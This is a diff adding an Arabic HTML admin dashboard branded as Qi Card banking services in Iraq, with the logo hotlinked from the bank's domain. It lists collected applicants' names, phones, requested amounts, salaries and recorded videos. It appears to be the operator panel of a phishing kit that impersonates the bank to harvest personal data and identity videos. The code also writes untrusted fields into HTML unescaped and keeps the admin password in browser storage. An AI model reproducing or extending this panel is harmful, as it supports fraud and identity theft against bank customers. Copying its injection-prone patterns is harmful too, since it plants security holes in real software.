@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة الإدارة | كي للخدمات المصرفية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --qi-navy: #002B5C;
+            --qi-gold: #f3cd00;
+            --qi-light: #F8F9FA;
+            --qi-white: #FFFFFF;
+            --qi-error: #DC2626;
+            --qi-success: #10B981;
+            --qi-border: #E9ECEF;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--qi-light);
+            color: var(--qi-navy);
+            min-height: 100vh;
+        }
+
+        /* شاشة تسجيل الدخول */
+        .login-screen {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, var(--qi-navy) 0%, #001a3d 100%);
+            padding: 20px;
+        }
+
+        .login-card {
+            background: var(--qi-white);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 20px;
+            padding: 40px 32px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .login-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: var(--qi-gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: 900;
+            color: var(--qi-navy);
+            box-shadow: 0 10px 30px rgba(243, 205, 0, 0.4);
+        }
+
+        .login-card h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--qi-navy);
+        }
+
+        .login-card .subtitle {
+            color: #6C757D;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--qi-border);
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: inherit;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+            outline: none;
+        }
+
+        .login-input:focus {
+            border-color: var(--qi-gold);
+            box-shadow: 0 0 0 3px rgba(243, 205, 0, 0.1);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(243, 205, 0, 0.4);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .login-error {
+            background: #FEF2F2;
+            color: var(--qi-error);
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            border: 1px solid #FECACA;
+        }
+
+        /* لوحة التحكم */
+        .dashboard { display: none; }
+        .dashboard.active { display: block; }
+
+        .top-bar {
+            background: var(--qi-white);
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border-bottom: 3px solid var(--qi-gold);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .top-bar-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .top-bar-logo {
+            height: 40px;
+        }
+
+        .top-bar-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--qi-navy);
+        }
+
+        .logout-btn {
+            padding: 8px 16px;
+            background: transparent;
+            color: var(--qi-error);
+            border: 2px solid var(--qi-error);
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .logout-btn:hover {
+            background: var(--qi-error);
+            color: white;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+
+        /* بطاقات الإحصائيات */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .stat-card {
+            background: var(--qi-white);
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+            border-right: 4px solid var(--qi-gold);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card .icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .stat-card .label {
+            font-size: 13px;
+            color: #6C757D;
+            margin-bottom: 6px;
+        }
+
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--qi-navy);
+            line-height: 1;
+        }
+
+        /* شريط الأدوات */
+        .toolbar {
+            background: var(--qi-white);
+            padding: 16px 20px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+        }
+
+        .search-box {
+            flex: 1;
+            min-width: 250px;
+            position: relative;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            border: 2px solid var(--qi-border);
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .search-input:focus {
+            border-color: var(--qi-gold);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 16px;
+        }
+
+        .refresh-btn {
+            padding: 10px 20px;
+            background: var(--qi-navy);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .refresh-btn:hover {
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+        }
+
+        .refresh-btn.loading {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* الجدول */
+        .table-container {
+            background: var(--qi-white);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+        }
+
+        .table-wrapper {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 900px;
+        }
+
+        thead {
+            background: var(--qi-navy);
+            color: white;
+        }
+
+        th {
+            padding: 16px;
+            text-align: right;
+            font-weight: 700;
+            font-size: 13px;
+            white-space: nowrap;
+        }
+
+        td {
+            padding: 16px;
+            border-bottom: 1px solid var(--qi-border);
+            font-size: 14px;
+            vertical-align: middle;
+        }
+
+        tbody tr {
+            transition: background 0.2s;
+        }
+
+        tbody tr:hover {
+            background: #FAFAFA;
+        }
+
+        .token-cell {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--qi-navy);
+            font-weight: 700;
+            background: rgba(243, 205, 0, 0.1);
+            padding: 4px 8px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+
+        .name-cell {
+            font-weight: 600;
+            color: var(--qi-navy);
+        }
+
+        .phone-cell {
+            direction: ltr;
+            text-align: right;
+            font-family: 'Courier New', monospace;
+            color: #555;
+        }
+
+        .amount-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            background: rgba(243, 205, 0, 0.15);
+            color: var(--qi-navy);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .date-cell {
+            font-size: 12px;
+            color: #6C757D;
+        }
+
+        .action-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            margin: 0 2px;
+            transition: all 0.2s;
+        }
+
+        .btn-video {
+            background: var(--qi-navy);
+            color: white;
+        }
+
+        .btn-video:hover {
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+        }
+
+        .btn-text {
+            background: var(--qi-success);
+            color: white;
+        }
+
+        .btn-text:hover {
+            background: #059669;
+        }
+
+        /* Modal للفيديو */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--qi-white);
+            border-radius: 20px;
+            max-width: 700px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--qi-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .modal-header h2 {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--qi-navy);
+        }
+
+        .close-btn {
+            background: transparent;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #6C757D;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .close-btn:hover {
+            background: var(--qi-light);
+            color: var(--qi-error);
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .modal-body video {
+            width: 100%;
+            border-radius: 12px;
+            background: #000;
+            max-height: 500px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .info-item {
+            background: var(--qi-light);
+            padding: 12px 16px;
+            border-radius: 10px;
+            border-right: 3px solid var(--qi-gold);
+        }
+
+        .info-item .label {
+            font-size: 11px;
+            color: #6C757D;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .info-item .value {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--qi-navy);
+        }
+
+        /* حالات فارغة */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+
+        .empty-state .icon {
+            font-size: 60px;
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+
+        .empty-state h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #666;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .container { padding: 16px; }
+            .top-bar { padding: 12px 16px; }
+            .top-bar-title { font-size: 14px; }
+            .stat-card .value { font-size: 24px; }
+            th, td { padding: 12px 8px; font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شاشة تسجيل الدخول -->
+    <div id="loginScreen" class="login-screen">
+        <div class="login-card">
+            <div class="login-logo">🔐</div>
+            <h1>لوحة الإدارة</h1>
+            <p class="subtitle">كي للخدمات المصرفية - العراق</p>
+            
+            <div class="login-error" id="loginError">كلمة المرور غير صحيحة</div>
+            
+            <form onsubmit="handleLogin(event)">
+                <input type="password" id="passwordInput" class="login-input" placeholder="كلمة المرور" required>
+                <button type="submit" class="login-btn" id="loginBtn">دخول</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- لوحة التحكم -->
+    <div id="dashboard" class="dashboard">
+        <div class="top-bar">
+            <div class="top-bar-left">
+                <img src="https://qi.iq/images/logo.svg?1=1" alt="QI" class="top-bar-logo">
+                <span class="top-bar-title">لوحة إدارة الطلبات</span>
+            </div>
+            <button class="logout-btn" onclick="logout()">🚪 تسجيل الخروج</button>
+        </div>
+
+        <div class="container">
+            <!-- الإحصائيات -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="icon">📊</div>
+                    <div class="label">إجمالي الطلبات</div>
+                    <div class="value" id="statTotal">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="icon">📅</div>
+                    <div class="label">طلبات اليوم</div>
+                    <div class="value" id="statToday">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="icon">💾</div>
+                    <div class="label">حجم البيانات</div>
+                    <div class="value" id="statSize">0 MB</div>
+                </div>
+                <div class="stat-card">
+                    <div class="icon">⏱️</div>
+                    <div class="label">آخر تحديث</div>
+                    <div class="value" id="statLastUpdate" style="font-size: 16px;">-</div>
+                </div>
+            </div>
+
+            <!-- شريط الأدوات -->
+            <div class="toolbar">
+                <div class="search-box">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" class="search-input" id="searchInput" placeholder="ابحث بالاسم، الهاتف، أو الرقم المرجعي..." oninput="filterData()">
+                </div>
+                <button class="refresh-btn" id="refreshBtn" onclick="loadData()">
+                    <span id="refreshIcon">🔄</span>
+                    <span id="refreshText">تحديث</span>
+                </button>
+            </div>
+
+            <!-- الجدول -->
+            <div class="table-container">
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>الرقم المرجعي</th>
+                                <th>الاسم</th>
+                                <th>الهاتف</th>
+                                <th>المبلغ</th>
+                                <th>الراتب</th>
+                                <th>التاريخ</th>
+                                <th>الإجراءات</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tableBody">
+                            <tr>
+                                <td colspan="8">
+                                    <div class="empty-state">
+                                        <div class="icon">📭</div>
+                                        <h3>جاري تحميل البيانات...</h3>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal الفيديو -->
+    <div id="videoModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modalTitle">معاينة الفيديو</h2>
+                <button class="close-btn" onclick="closeModal()">✕</button>
+            </div>
+            <div class="modal-body">
+                <video id="modalVideo" controls></video>
+                <div class="info-grid" id="modalInfo"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let allData = [];
+        let authToken = '';
+
+        // تسجيل الدخول
+        async function handleLogin(e) {
+            e.preventDefault();
+            const password = document.getElementById('passwordInput').value;
+            const btn = document.getElementById('loginBtn');
+            const errorEl = document.getElementById('loginError');
+            
+            btn.disabled = true;
+            btn.textContent = 'جاري التحقق...';
+            errorEl.style.display = 'none';
+
+            try {
+                const response = await fetch('/api/list', {
+                    headers: { 'Authorization': `Bearer ${password}` }
+                });
+
+                if (response.ok) {
+                    authToken = password;
+                    localStorage.setItem('qi_admin_token', password);
+                    showDashboard();
+                    const data = await response.json();
+                    allData = data.data || [];
+                    renderTable(allData);
+                    updateStats(allData);
+                } else {
+                    errorEl.style.display = 'block';
+                }
+            } catch (error) {
+                errorEl.textContent = 'خطأ في الاتصال';
+                errorEl.style.display = 'block';
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'دخول';
+            }
+        }
+
+        // التحقق من الجلسة المحفوظة
+        async function checkSession() {
+            const savedToken = localStorage.getItem('qi_admin_token');
+            if (!savedToken) return;
+
+            try {
+                const response = await fetch('/api/list', {
+                    headers: { 'Authorization': `Bearer ${savedToken}` }
+                });
+                if (response.ok) {
+                    authToken = savedToken;
+                    showDashboard();
+                    const data = await response.json();
+                    allData = data.data || [];
+                    renderTable(allData);
+                    updateStats(allData);
+                } else {
+                    localStorage.removeItem('qi_admin_token');
+                }
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        function showDashboard() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').classList.add('active');
+        }
+
+        function logout() {
+            localStorage.removeItem('qi_admin_token');
+            authToken = '';
+            location.reload();
+        }
+
+        // تحميل البيانات
+        async function loadData() {
+            const btn = document.getElementById('refreshBtn');
+            const icon = document.getElementById('refreshIcon');
+            const text = document.getElementById('refreshText');
+            
+            btn.classList.add('loading');
+            icon.innerHTML = '<span class="loading-spinner"></span>';
+            text.textContent = 'جاري التحديث...';
+
+            try {
+                const response = await fetch('/api/list', {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                const data = await response.json();
+                allData = data.data || [];
+                renderTable(allData);
+                updateStats(allData);
+            } catch (error) {
+                alert('خطأ في تحميل البيانات');
+            } finally {
+                btn.classList.remove('loading');
+                icon.textContent = '🔄';
+                text.textContent = 'تحديث';
+            }
+        }
+
+        // عرض الجدول
+        function renderTable(data) {
+            const tbody = document.getElementById('tableBody');
+            
+            if (data.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="8">
+                            <div class="empty-state">
+                                <div class="icon">📭</div>
+                                <h3>لا توجد طلبات</h3>
+                                <p>لم يتم العثور على أي طلبات حتى الآن</p>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            tbody.innerHTML = data.map((item, index) => `
+                <tr>
+                    <td><strong>${index + 1}</strong></td>
+                    <td><span class="token-cell">${item.token || '-'}</span></td>
+                    <td class="name-cell">${item.context?.name || item.context?.token || '-'}</td>
+                    <td class="phone-cell">${item.context?.phone || '-'}</td>
+                    <td><span class="amount-badge">${item.context?.amount || '-'}</span></td>
+                    <td>${item.context?.salary || '-'}</td>
+                    <td class="date-cell">${formatDate(item.createdAt)}</td>
+                    <td>
+                        <button class="action-btn btn-video" onclick="viewVideo('${item.videoUrl}', '${item.token}', '${item.context?.name || ''}', '${item.context?.phone || ''}')">▶️ فيديو</button>
+                        ${item.textUrl ? `<button class="action-btn btn-text" onclick="window.open('${item.textUrl}', '_blank')">📄 تفاصيل</button>` : ''}
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        // تحديث الإحصائيات
+        function updateStats(data) {
+            document.getElementById('statTotal').textContent = data.length;
+            
+            const today = new Date().toDateString();
+            const todayCount = data.filter(d => new Date(d.createdAt).toDateString() === today).length;
+            document.getElementById('statToday').textContent = todayCount;
+            
+            const totalBytes = data.reduce((sum, d) => sum + (d.size || 0), 0);
+            document.getElementById('statSize').textContent = formatSize(totalBytes);
+            
+            document.getElementById('statLastUpdate').textContent = new Date().toLocaleTimeString('ar-IQ');
+        }
+
+        // البحث
+        function filterData() {
+            const query = document.getElementById('searchInput').value.toLowerCase().trim();
+            if (!query) {
+                renderTable(allData);
+                return;
+            }
+            
+            const filtered = allData.filter(item => {
+                const name = (item.context?.name || '').toLowerCase();
+                const phone = (item.context?.phone || '').toLowerCase();
+                const token = (item.token || '').toLowerCase();
+                return name.includes(query) || phone.includes(query) || token.includes(query);
+            });
+            
+            renderTable(filtered);
+        }
+
+        // عرض الفيديو
+        function viewVideo(url, token, name, phone) {
+            document.getElementById('modalTitle').textContent = `معاينة الفيديو - ${token}`;
+            document.getElementById('modalVideo').src = url;
+            document.getElementById('modalInfo').innerHTML = `
+                <div class="info-item">
+                    <div class="label">الرقم المرجعي</div>
+                    <div class="value">${token}</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">الاسم</div>
+                    <div class="value">${name || '-'}</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">الهاتف</div>
+                    <div class="value">${phone || '-'}</div>
+                </div>
+            `;
+            document.getElementById('videoModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('videoModal').classList.remove('active');
+            document.getElementById('modalVideo').pause();
+            document.getElementById('modalVideo').src = '';
+        }
+
+        // دوال مساعدة
+        function formatDate(dateStr) {
+            if (!dateStr) return '-';
+            const date = new Date(dateStr);
+            return date.toLocaleString('ar-IQ', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+
+        function formatSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return (bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
+        }
+
+        // إغلاق Modal بالضغط خارجها
+        document.getElementById('videoModal').addEventListener('click', (e) => {
+            if (e.target.id === 'videoModal') closeModal();
+        });
+
+        // التحقق من الجلسة عند تحميل الصفحة
+        checkSession();
+    </script>
+</body>
+</html>
